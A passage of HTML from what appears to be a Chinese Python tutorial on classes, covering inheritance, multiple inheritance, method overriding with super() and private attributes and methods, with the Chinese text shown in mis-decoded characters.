class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŸºç±»å®šä¹‰åœ¨å¦ä¸€ä¸ªæ¨¡å—ä¸­æ—¶</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">DerivedClassName</span><span class="token punctuation">(</span>modname<span class="token punctuation">.</span>BaseClassName<span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ç±»å®šä¹‰</span><span class="token keyword">class</span> <span class="token class-name">people</span><span class="token punctuation">:</span>    <span class="token comment">#å®šä¹‰åŸºæœ¬å±æ€§</span>    name <span class="token operator">=</span> <span class="token string">''</span>    age <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment">#å®šä¹‰ç§æœ‰å±æ€§,ç§æœ‰å±æ€§åœ¨ç±»å¤–éƒ¨æ— æ³•ç›´æ¥è¿›è¡Œè®¿é—®</span>    __weight <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment">#å®šä¹‰æ„é€ æ–¹æ³•</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> n        self<span class="token punctuation">.</span>age <span class="token operator">=</span> a        self<span class="token punctuation">.</span>__weight <span class="token operator">=</span> w    <span class="token keyword">def</span> <span class="token function">speak</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s è¯´: æˆ‘ %d å²ã€‚"</span> <span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#å•ç»§æ‰¿ç¤ºä¾‹</span><span class="token keyword">class</span> <span class="token class-name">student</span><span class="token punctuation">(</span>people<span class="token punctuation">)</span><span class="token punctuation">:</span>    grade <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">,</span>g<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#è°ƒç”¨çˆ¶ç±»çš„æ„å‡½</span>        people<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>grade <span class="token operator">=</span> g    <span class="token comment">#è¦†å†™çˆ¶ç±»çš„æ–¹æ³•</span>    <span class="token keyword">def</span> <span class="token function">speak</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s è¯´: æˆ‘ %d å²äº†ï¼Œæˆ‘åœ¨è¯» %d å¹´çº§"</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>age<span class="token punctuation">,</span>self<span class="token punctuation">.</span>grade<span class="token punctuation">)</span><span class="token punctuation">)</span>   s <span class="token operator">=</span> student<span class="token punctuation">(</span><span class="token string">'ken'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>speak<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''ken è¯´: æˆ‘ 10 å²äº†ï¼Œæˆ‘åœ¨è¯» 3 å¹´çº§'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>ç»§æ‰¿æ—¶å¯ä»¥ç›´æ¥è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œå†æ·»åŠ æ–°çš„å˜é‡</li><li>çˆ¶ç±»çš„æ–¹æ³•ä¹Ÿèƒ½ç›´æ¥è°ƒç”¨æˆ–è€…é‡å†™</li><li>å­ç±»ä¸é‡å†™ **_<em>init</em><em>**ï¼Œå®ä¾‹åŒ–å­ç±»æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨çˆ¶ç±»å®šä¹‰çš„ **_<em>init</em></em>**</li></ol><h3 id="å¤šç»§æ‰¿"><a href="#å¤šç»§æ‰¿" class="headerlink" title="å¤šç»§æ‰¿"></a>å¤šç»§æ‰¿</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">DerivedClassName</span><span class="token punctuation">(</span>Base1<span class="token punctuation">,</span> Base2<span class="token punctuation">,</span> Base3<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>statement<span class="token operator">-</span><span class="token number">1</span><span class="token operator">&gt;</span>    <span class="token punctuation">.</span>    <span class="token punctuation">.</span>    <span class="token punctuation">.</span>    <span class="token operator">&lt;</span>statement<span class="token operator">-</span>N<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‹¥æ˜¯çˆ¶ç±»ä¸­æœ‰ç›¸åŒçš„æ–¹æ³•åï¼Œè€Œåœ¨å­ç±»ä½¿ç”¨æ—¶æœªæŒ‡å®šï¼Œpythonä»å·¦è‡³å³æœç´¢ å³æ–¹æ³•åœ¨å­ç±»ä¸­æœªæ‰¾åˆ°æ—¶ï¼Œä»å·¦åˆ°å³æŸ¥æ‰¾çˆ¶ç±»ä¸­æ˜¯å¦åŒ…å«æ–¹æ³•</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ç±»å®šä¹‰</span><span class="token keyword">class</span> <span class="token class-name">people</span><span class="token punctuation">:</span>    <span class="token comment">#å®šä¹‰åŸºæœ¬å±æ€§</span>    name <span class="token operator">=</span> <span class="token string">''</span>    age <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment">#å®šä¹‰ç§æœ‰å±æ€§,ç§æœ‰å±æ€§åœ¨ç±»å¤–éƒ¨æ— æ³•ç›´æ¥è¿›è¡Œè®¿é—®</span>    __weight <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment">#å®šä¹‰æ„é€ æ–¹æ³•</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> n        self<span class="token punctuation">.</span>age <span class="token operator">=</span> a        self<span class="token punctuation">.</span>__weight <span class="token operator">=</span> w    <span class="token keyword">def</span> <span class="token function">speak</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s è¯´: æˆ‘ %d å²ã€‚"</span> <span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#å•ç»§æ‰¿ç¤ºä¾‹</span><span class="token keyword">class</span> <span class="token class-name">student</span><span class="token punctuation">(</span>people<span class="token punctuation">)</span><span class="token punctuation">:</span>    grade <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">,</span>g<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#è°ƒç”¨çˆ¶ç±»çš„æ„å‡½</span>        people<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>grade <span class="token operator">=</span> g    <span class="token comment">#è¦†å†™çˆ¶ç±»çš„æ–¹æ³•</span>    <span class="token keyword">def</span> <span class="token function">speak</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s è¯´: æˆ‘ %d å²äº†ï¼Œæˆ‘åœ¨è¯» %d å¹´çº§"</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>age<span class="token punctuation">,</span>self<span class="token punctuation">.</span>grade<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#å¦ä¸€ä¸ªç±»ï¼Œå¤šé‡ç»§æ‰¿ä¹‹å‰çš„å‡†å¤‡</span><span class="token keyword">class</span> <span class="token class-name">speaker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    topic <span class="token operator">=</span> <span class="token string">''</span>    name <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> n        self<span class="token punctuation">.</span>topic <span class="token operator">=</span> t    <span class="token keyword">def</span> <span class="token function">speak</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æˆ‘å« %sï¼Œæˆ‘æ˜¯ä¸€ä¸ªæ¼”è¯´å®¶ï¼Œæˆ‘æ¼”è®²çš„ä¸»é¢˜æ˜¯ %s"</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>topic<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#å¤šé‡ç»§æ‰¿</span><span class="token keyword">class</span> <span class="token class-name">sample</span><span class="token punctuation">(</span>speaker<span class="token punctuation">,</span>student<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">,</span>g<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>        student<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">,</span>g<span class="token punctuation">)</span>        speaker<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>t<span class="token punctuation">)</span> test <span class="token operator">=</span> sample<span class="token punctuation">(</span><span class="token string">"Tim"</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"Python"</span><span class="token punctuation">)</span>test<span class="token punctuation">.</span>speak<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#æ–¹æ³•ååŒï¼Œé»˜è®¤è°ƒç”¨çš„æ˜¯åœ¨æ‹¬å·ä¸­æ’å‰åœ°çˆ¶ç±»çš„æ–¹æ³•</span><span class="token triple-quoted-string string">'''æˆ‘å« Timï¼Œæˆ‘æ˜¯ä¸€ä¸ªæ¼”è¯´å®¶ï¼Œæˆ‘æ¼”è®²çš„ä¸»é¢˜æ˜¯ Python'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ–¹æ³•é‡å†™"><a href="#æ–¹æ³•é‡å†™" class="headerlink" title="æ–¹æ³•é‡å†™"></a>æ–¹æ³•é‡å†™</h3><p>super() å‡½æ•°æ˜¯ç”¨äºè°ƒç”¨çˆ¶ç±»(è¶…ç±»)çš„ä¸€ä¸ªæ–¹æ³•</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Parent</span><span class="token punctuation">:</span>        <span class="token comment"># å®šä¹‰çˆ¶ç±»</span>   <span class="token keyword">def</span> <span class="token function">myMethod</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'è°ƒç”¨çˆ¶ç±»æ–¹æ³•'</span><span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">Child</span><span class="token punctuation">(</span>Parent<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># å®šä¹‰å­ç±»</span>   <span class="token keyword">def</span> <span class="token function">myMethod</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'è°ƒç”¨å­ç±»æ–¹æ³•'</span><span class="token punctuation">)</span> c <span class="token operator">=</span> Child<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment"># å­ç±»å®ä¾‹</span>c<span class="token punctuation">.</span>myMethod<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token comment"># å­ç±»è°ƒç”¨é‡å†™æ–¹æ³•</span><span class="token builtin">super</span><span class="token punctuation">(</span>Child<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>myMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#ç”¨å­ç±»å¯¹è±¡è°ƒç”¨çˆ¶ç±»å·²è¢«è¦†ç›–çš„æ–¹æ³•</span><span class="token triple-quoted-string string">'''è°ƒç”¨å­ç±»æ–¹æ³•è°ƒç”¨çˆ¶ç±»æ–¹æ³•'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å­ç±»ç»§æ‰¿çˆ¶ç±»æ„é€ å‡½æ•°è¯´æ˜"><a href="#å­ç±»ç»§æ‰¿çˆ¶ç±»æ„é€ å‡½æ•°è¯´æ˜" class="headerlink" title="å­ç±»ç»§æ‰¿çˆ¶ç±»æ„é€ å‡½æ•°è¯´æ˜"></a>å­ç±»ç»§æ‰¿çˆ¶ç±»æ„é€ å‡½æ•°è¯´æ˜</h3><p>å­ç±»ä¸é‡å†™ **_<em>init</em><em>**ï¼Œå®ä¾‹åŒ–å­ç±»æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨çˆ¶ç±»å®šä¹‰çš„ **_<em>init</em></em>**</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Father</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name<span class="token operator">=</span>name        <span class="token keyword">print</span> <span class="token punctuation">(</span> <span class="token string">"name: %s"</span> <span class="token operator">%</span><span class="token punctuation">(</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">getName</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Father '</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>name <span class="token keyword">class</span> <span class="token class-name">Son</span><span class="token punctuation">(</span>Father<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">getName</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Son '</span><span class="token operator">+</span>self<span class="token punctuation">.</span>name <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    son<span class="token operator">=</span>Son<span class="token punctuation">(</span><span class="token string">'runoob'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span> son<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''name: runoobSon runoob'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœé‡å†™äº†<strong>_<em>init</em>_</strong> æ—¶ï¼Œå®ä¾‹åŒ–å­ç±»ï¼Œå°±ä¸ä¼šè°ƒç”¨çˆ¶ç±»å·²ç»å®šä¹‰çš„ <strong>_<em>init</em>_</strong></p><p>å¦‚æœé‡å†™äº†<strong>_<em>init</em>_</strong> æ—¶ï¼Œè¦ç»§æ‰¿çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨ <strong>super</strong> å…³é”®å­—</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">super</span><span class="token punctuation">(</span>å­ç±»ï¼Œself<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>å‚æ•°<span class="token number">1</span>ï¼Œå‚æ•°<span class="token number">2</span>ï¼Œ<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿˜æœ‰ä¸€ç§ç»å…¸å†™æ³•</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">çˆ¶ç±»åç§°<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>å‚æ•°<span class="token number">1</span>ï¼Œå‚æ•°<span class="token number">2</span>ï¼Œ<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Father</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name<span class="token operator">=</span>name        <span class="token keyword">print</span> <span class="token punctuation">(</span> <span class="token string">"name: %s"</span> <span class="token operator">%</span><span class="token punctuation">(</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">getName</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Father '</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>name <span class="token keyword">class</span> <span class="token class-name">Son</span><span class="token punctuation">(</span>Father<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Son<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"hi"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span>  name    <span class="token keyword">def</span> <span class="token function">getName</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Son '</span><span class="token operator">+</span>self<span class="token punctuation">.</span>name <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    son<span class="token operator">=</span>Son<span class="token punctuation">(</span><span class="token string">'runoob'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span> son<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''name: runoobhiSon runoob'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç±»å±æ€§ä¸æ–¹æ³•"><a href="#ç±»å±æ€§ä¸æ–¹æ³•" class="headerlink" title="ç±»å±æ€§ä¸æ–¹æ³•"></a>ç±»å±æ€§ä¸æ–¹æ³•</h3><h4 id="ç±»çš„ç§æœ‰å±æ€§"><a href="#ç±»çš„ç§æœ‰å±æ€§" class="headerlink" title="ç±»çš„ç§æœ‰å±æ€§"></a>ç±»çš„ç§æœ‰å±æ€§</h4><p><strong>__private_attrs</strong>ï¼šä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å¤´ï¼Œå£°æ˜è¯¥å±æ€§ä¸ºç§æœ‰ï¼Œä¸èƒ½åœ¨ç±»çš„å¤–éƒ¨è¢«ä½¿ç”¨æˆ–ç›´æ¥è®¿é—®ã€‚åœ¨ç±»å†…éƒ¨çš„æ–¹æ³•ä¸­ä½¿ç”¨æ—¶ <strong>self.__private_attrs</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">JustCounter</span><span class="token punctuation">:</span>    __secretCount <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># ç§æœ‰å˜é‡</span>    publicCount <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment"># å…¬å¼€å˜é‡</span>     <span class="token keyword">def</span> <span class="token function">count</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>__secretCount <span class="token operator">+=</span> <span class="token number">1</span>        self<span class="token punctuation">.</span>publicCount <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>__secretCount<span class="token punctuation">)</span> counter <span class="token operator">=</span> JustCounter<span class="token punctuation">(</span><span class="token punctuation">)</span>counter<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span>counter<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>counter<span class="token punctuation">.</span>publicCount<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>counter<span class="token punctuation">.</span>__secretCount<span class="token punctuation">)</span>  <span class="token comment"># æŠ¥é”™ï¼Œå®ä¾‹ä¸èƒ½è®¿é—®ç§æœ‰å˜é‡</span><span class="token triple-quoted-string string">'''122Traceback (most recent call last):  File "test.py", line 16, in &lt;module&gt;    print (counter.__secretCount)  # æŠ¥é”™ï¼Œå®ä¾‹ä¸èƒ½è®¿é—®ç§æœ‰å˜é‡AttributeError: 'JustCounter' object has no attribute '__secretCount''''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ç±»çš„æ–¹æ³•-1"><a href="#ç±»çš„æ–¹æ³•-1" class="headerlink" title="ç±»çš„æ–¹æ³•"></a>ç±»çš„æ–¹æ³•</h4><p>åœ¨ç±»çš„å†…éƒ¨ï¼Œä½¿ç”¨ def å…³é”®å­—æ¥å®šä¹‰ä¸€ä¸ªæ–¹æ³•ï¼Œä¸ä¸€èˆ¬å‡½æ•°å®šä¹‰ä¸åŒï¼Œç±»æ–¹æ³•å¿…é¡»åŒ…å«å‚æ•° <strong>self</strong>ï¼Œä¸”ä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ<strong>self</strong> ä»£è¡¨çš„æ˜¯ç±»çš„å®ä¾‹</p><p><strong>self</strong> çš„åå­—å¹¶ä¸æ˜¯è§„å®šæ­»çš„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ <strong>this</strong>ï¼Œä½†æ˜¯æœ€å¥½è¿˜æ˜¯æŒ‰ç…§çº¦å®šä½¿ç”¨ <strong>self</strong></p><h4 id="ç±»çš„ç§æœ‰æ–¹æ³•"><a href="#ç±»çš„ç§æœ‰æ–¹æ³•" class="headerlink" title="ç±»çš„ç§æœ‰æ–¹æ³•"></a>ç±»çš„ç§æœ‰æ–¹æ³•</h4><p><strong>__private_method</strong>ï¼šä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å¤´ï¼Œå£°æ˜è¯¥æ–¹æ³•ä¸ºç§æœ‰æ–¹æ³•ï¼Œåªèƒ½åœ¨ç±»çš„å†…éƒ¨è°ƒç”¨ ï¼Œä¸èƒ½åœ¨ç±»çš„å¤–éƒ¨è°ƒç”¨<strong>self.__private_methods</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Site</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name       <span class="token comment"># public</span>        self<span class="token punctuation">.</span>__url <span class="token operator">=</span> url   <span class="token comment"># private</span>     <span class="token keyword">def</span> <span class="token function">who</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'name  : '</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'url : '</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>__url<span class="token punctuation">)</span>     <span class="token keyword">def</span> <span class="token function">__foo</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment"># ç§æœ‰æ–¹æ³•</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'è¿™æ˜¯ç§æœ‰æ–¹æ³•'</span><span class="token punctuation">)</span>     <span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># å…¬å…±æ–¹æ³•</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'è¿™æ˜¯å…¬å…±æ–¹æ³•'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>__foo<span class="token punctuation">(</span><span class="token punctuation">)</span> x <span class="token operator">=</span> Site<span class="token punctuation">(</span><span class="token string">'èœé¸Ÿæ•™ç¨‹'</span><span class="token punctuation">,</span> <span class="token string">'www.runoob.com'</span><span class="token punctuation">)</span>x<span class="token punctuation">.</span>who<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># æ­£å¸¸è¾“å‡º</span>x<span class="token punctuation">.</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># æ­£å¸¸è¾“å‡º</span>x<span class="token punctuation">.</span>__foo<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment"># æŠ¥é”™</span><span class="token triple-quoted-string string">'''name  :  èœé¸Ÿæ•™ç¨‹url :  www.runoob.comè¿™æ˜¯å…¬å…±æ–¹æ³•è¿™æ˜¯ç§æœ‰æ–¹æ³•Traceback (most recent call last):  File xxxx in &lt;module&gt;    x.__foo()  # æŠ¥é”™AttributeError: 'Site' object has no attribute '__foo''''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç±»çš„ä¸“æœ‰æ–¹æ³•"><a href="#ç±»çš„ä¸“æœ‰æ–¹æ³•" class="headerlink" title="ç±»çš„ä¸“æœ‰æ–¹æ³•"></a>ç±»çš„ä¸“æœ‰æ–¹æ³•</h3><ul><li><strong><strong>init</strong> :</strong> æ„é€ 